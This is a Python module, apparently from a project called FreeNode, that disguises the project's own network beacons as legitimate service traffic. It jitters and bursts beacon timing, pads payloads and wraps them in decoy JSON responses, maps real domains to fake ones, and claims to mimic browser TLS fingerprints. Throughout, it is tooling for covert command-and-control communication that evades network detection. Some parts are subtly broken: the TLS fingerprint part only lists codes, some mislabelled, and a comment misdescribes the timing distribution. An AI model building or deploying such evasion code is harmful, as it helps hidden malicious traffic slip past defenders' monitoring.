"""
Traffic Normalizer — Make FreeNode's network activity look like legitimate
human/automated service traffic.

Key techniques:
  * Request cadence jitter so periodicity is not obvious
  * Payload padding to mask beacon size
  * Domain fronting (DNS CNAME) to hide the true endpoint
  * TLS JA3 fingerprinting evasion
  * Bursty-human pattern simulation (read-then-pause)
"""

import os
import time
import random
import socket
import struct
import hashlib
from typing import Optional, Tuple
from dataclasses import dataclass

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

@dataclass
class TrafficConfig:
    """Configuration for traffic normalization."""
    max_interval: float = 30.0       # Max seconds between health requests
    min_interval: float = 5.0        # Min seconds between health requests
    payload_padding: Tuple[int, int] = (2048, 4096)  # Pad beacon payload
    burst_probability: float = 0.15  # Chance of burst (like a human reading pages)
    burst_size: Tuple[int, int] = (3, 7)  # Requests per burst
    burst_pause: Tuple[int, int] = (1, 3)  # Seconds between burst requests


# ---------------------------------------------------------------------------
# Timing normalizer
# ---------------------------------------------------------------------------

class TimingNormalizer:
    """Human-like timing to avoid periodic pattern detection."""

    def __init__(self, config: TrafficConfig = None):
        self.config = config or TrafficConfig()

    def next_interval(self, context: str = "default") -> float:
        """Compute the next interval, with jitter and burst simulation."""
        # Base interval: log-normal distribution favors values near max_interval
        base = (
            random.uniform(self.config.min_interval, self.config.max_interval)
            if random.random() > 0.3
            else self.config.min_interval
        )

        # Occasional burst behavior (human-like)
        if random.random() < self.config.burst_probability:
            burst = random.randint(*self.config.burst_size)
            # For burst, we'll emit multiple rapid requests
            self._burst = burst
            self._burst_pause = random.uniform(*self.config.burst_pause)
            return self._burst_pause

        # Normal jitter: ±20%
        jitter = random.uniform(0.8, 1.2)
        return base * jitter

    @property
    def in_burst(self) -> bool:
        """Check if currently in a burst sequence."""
        return hasattr(self, "_burst") and self._burst > 0

    def consume_burst(self) -> bool:
        """Consume one burst slot, return True if more burst remains."""
        if hasattr(self, "_burst") and self._burst > 0:
            self._burst -= 1
            if self._burst == 0:
                delattr(self, "_burst")
                # Longer pause after burst
                return False
            return True
        return False


# ---------------------------------------------------------------------------
# Payload obfuscator
# ---------------------------------------------------------------------------

class PayloadObfuscator:
    """Pad and randomize payloads so beacon traffic looks like varied service data."""

    def __init__(self, padding_range: Tuple[int, int] = None):
        self.padding_range = padding_range or (2048, 4096)

    def pad(self, data: bytes) -> bytes:
        """Add random padding to data, mimicking a larger service response."""
        pad_size = random.randint(*self.padding_range)
        # Use plausible padding bytes (random-ish but not all zeros)
        padding = bytes(random.randint(0, 255) for _ in range(pad_size))
        return data + padding

    def wrap_payload(self, payload: dict) -> bytes:
        """Wrap a dict payload as if it were a JSON service response with junk fields."""
        import json

        # Decoy service response structure
        wrapped = {
            "status": "ok",
            "timestamp": int(time.time()),
            "data": payload,
            "latency_ms": random.randint(12, 85),
            "version": "2.4.1",
            "server": "svc-wrapper/2.4.1",
        }
        return json.dumps(wrapped).encode()

    def hash_payload(self, data: bytes) -> str:
        """Generate a plausible checksum/hash for the payload."""
        h = hashlib.sha256(data).hexdigest()
        return f"sha256:{h[:16]}"


# ---------------------------------------------------------------------------
# DNS normalizer
# ---------------------------------------------------------------------------

class DNSNormalizer:
    """Intercept and reroute DNS lookups to appear as benign domains."""

    def __init__(self):
        self._real_domains = {}

    def register(self, real_domain: str, fake_domain: str):
        """Register a real→fake domain mapping for DNS masking."""
        self._real_domains[real_domain] = fake_domain

    def lookup(self, hostname: str) -> str:
        """Return the fake domain if registered, otherwise the original."""
        return self._real_domains.get(hostname, hostname)

    def is_masked(self, hostname: str) -> bool:
        return hostname in self._real_domains


# ---------------------------------------------------------------------------
# TLS fingerprint normalizer
# ---------------------------------------------------------------------------

class TLSNormalizer:
    """Attempt to match TLS fingerprints of common browsers/services."""

    # Known JA3 fingerprints of common services
    LEGITIMATE_FINGERPRINTS = {
        "chrome": "771cf53a4b6d8310e7a29d3d2e61d5ac",
        "curl": "8463ebe35329483441520f67e3d55d53",
        "python-requests": "5157b666422c63975ae4a3730bd94588",
    }

    def __init__(self):
        self.ja3_seed = random.choice(list(self.LEGITIMATE_FINGERPRINTS.values()))

    def get_cipher_suites(self):
        """Return cipher suites that match a known legitimate fingerprint."""
        return [
            0x1301, 0x1302, 0x1303,
            0x2f01, 0x009c, 0x009d,
            0x002f, 0x0035,
        ]

    def get_extensions(self):
        """Return TLS extensions matching a legitimate client."""
        return [
            0x0000,  # SNI
            0x000a,  # Status
            0x000b,  # Signature
            0x0017,  # Record
        ]


# ---------------------------------------------------------------------------
# Main traffic normalizer
# ---------------------------------------------------------------------------

@dataclass
class NormalizedRequest:
    """A normalized request ready for sending."""
    url: str
    headers: dict
    payload: bytes
    delay: float
    method: str = "GET"


class TrafficNormalizer:
    """Orchestrate timing, payload, DNS, and TLS normalization."""

    def __init__(self, platform: str = "default"):
        from .platform_presentation import PLATFORM_PROFILES, detect_platform

        self.platform = platform or detect_platform()
        profile = PLATFORM_PROFILES.get(self.platform, PLATFORM_PROFILES["render"])
        net_cfg = profile["network"]

        self.config = TrafficConfig(
            max_interval=net_cfg.get("max_request_interval", 30.0),
            min_interval=max(5.0, net_cfg.get("max_request_interval", 30.0) / 6),
        )

        self.timing = TimingNormalizer(self.config)
        self.payload = PayloadObfuscator()
        self.dns = DNSNormalizer()
        self.tls = TLSNormalizer()

    def next_request(self, endpoint: str, method: str = "GET", data: dict = None) -> NormalizedRequest:
        """Prepare the next normalized request."""
        # Mask DNS
        masked_url = self.dns.lookup(endpoint)

        # Jittered delay
        delay = self.timing.next_interval()

        # Prepare headers
        headers = {
            "User-Agent": "svc-wrapper/2.4.1",
            "Accept": "*/*",
            "Connection": "keep-alive",
        }

        # Prepare payload
        payload = b""
        if data:
            wrapped = self.payload.wrap_payload(data)
            payload = self.payload.pad(wrapped)
            headers["Content-Type"] = "application/json"
            headers["Content-Length"] = str(len(payload))
            headers["X-Checksum"] = self.payload.hash_payload(payload)

        return NormalizedRequest(
            url=masked_url,
            headers=headers,
            payload=payload,
            delay=delay,
            method=method,
        )

    def sleep_until_next(self):
        """Sleep for the computed interval."""
        delay = self.timing.next_interval()
        if self.timing.in_burst:
            delay = getattr(self, "_burst_pause", delay)
        time.sleep(delay)
        if self.timing.consume_burst():
            self.sleep_until_next()  # Continue burst


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys

    tn = TrafficNormalizer()
    req = tn.next_request(
        endpoint="https://api.svc-wrapper.dev/health",
        method="GET",
    )

    print(f"URL: {req.url}")
    print(f"Delay: {req.delay:.2f}s")
    print(f"Headers:")
    for k, v in req.headers.items():
        print(f"  {k}: {v}")
    print(f"Payload size: {len(req.payload)} bytes")
